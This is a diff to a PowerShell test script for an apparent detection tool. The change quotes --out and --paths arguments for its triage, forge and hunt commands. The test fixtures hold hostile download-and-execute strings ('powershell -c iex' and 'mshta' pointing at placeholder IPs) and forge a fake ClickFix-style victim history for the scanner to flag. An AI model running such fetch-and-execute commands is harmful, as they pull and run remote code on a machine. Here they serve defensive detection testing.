@@ -51,11 +51,11 @@ Assert-True ($LASTEXITCODE -ge 1 -and ($stdinOut -join ' ') -match 'SUSPICIOUS|M
 # json structure + masking (diagnose windows-native arg quirks if it breaks)
 $fxJson = Join-Path $work 'tri.json'
 $triCmd = "powershell -c iex http://198.51.100.4/a.ps1; echo '$tok'"
-$jsonRun = & $pwsh -NoProfile -File $dist triage $triCmd --json --out=$fxJson 2>&1
+$jsonRun = & $pwsh -NoProfile -File $dist triage $triCmd --json "--out=$fxJson" 2>&1
 $jsonRc = $LASTEXITCODE
 if (-not (Test-Path $fxJson)) {
     Write-Output "  diag: rc=$jsonRc output: $($jsonRun -join ' | ')"
-    & $pwsh -NoProfile -File $dist triage $triCmd --json --out=$fxJson argv 2>&1 | ForEach-Object { Write-Output "  argv: $_" }
+    & $pwsh -NoProfile -File $dist triage $triCmd --json "--out=$fxJson" argv 2>&1 | ForEach-Object { Write-Output "  argv: $_" }
 }
 $jraw = [System.IO.File]::ReadAllText($fxJson)
 $j = $jraw | ConvertFrom-Json
@@ -64,27 +64,27 @@ Assert-True ($jraw -notmatch [regex]::Escape($tok)) -Name 'json report carries n
 
 # md report
 $fxMd = Join-Path $work 'tri.md'
-& $pwsh -NoProfile -File $dist triage 'mshta http://203.0.113.5/a.hta' --md --out=$fxMd | Out-Null
+& $pwsh -NoProfile -File $dist triage 'mshta http://203.0.113.5/a.hta' --md "--out=$fxMd" | Out-Null
 $md = [System.IO.File]::ReadAllText($fxMd)
 Assert-True ($md -match '^# placebo triage report') -Name 'markdown report written via --out'
 
 Write-Output '== forge + hunt flows'
 $f1 = Join-Path $work 'v1'; $f2 = Join-Path $work 'v2'
-& $pwsh -NoProfile -File $dist forge --out=$f1 --profile=clickfix-enc | Out-Null
-& $pwsh -NoProfile -File $dist forge --out=$f2 --profile=clickfix-enc | Out-Null
+& $pwsh -NoProfile -File $dist forge "--out=$f1" --profile=clickfix-enc | Out-Null
+& $pwsh -NoProfile -File $dist forge "--out=$f2" --profile=clickfix-enc | Out-Null
 Assert-True (Test-Path (Join-Path $f1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')) -Name 'forge creates history via cli'
 $h1 = (Get-FileHash -Algorithm SHA256 (Join-Path $f1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')).Hash
 $h2 = (Get-FileHash -Algorithm SHA256 (Join-Path $f2 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt')).Hash
 Assert-True ($h1 -eq $h2) -Name 'forge deterministic via cli'
 
 $huntJson = Join-Path $work 'hunt.json'
-& $pwsh -NoProfile -File $dist hunt --paths=$f1 --json --out=$huntJson | Out-Null
+& $pwsh -NoProfile -File $dist hunt "--paths=$f1" --json "--out=$huntJson" | Out-Null
 $huntExit = $LASTEXITCODE
 $hj = ([System.IO.File]::ReadAllText($huntJson)) | ConvertFrom-Json
 Assert-True ($huntExit -ge 2 -and $hj.verdict -eq 'critical') -Name 'hunt over forged victim exits malicious/critical'
 Assert-True (@($hj.findings).Count -ge 3) -Name 'hunt findings >= 3 on forged victim'
 
-& $pwsh -NoProfile -File $dist hunt --paths=$f1 --fail-on=suspicious | Out-Null
+& $pwsh -NoProfile -File $dist hunt "--paths=$f1" --fail-on=suspicious | Out-Null
 Assert-True ($LASTEXITCODE -eq 10) -Name 'hunt --fail-on=suspicious trips gate exit 10'
 
 # clean-machine gate check must be isolated from whatever the host/runner really
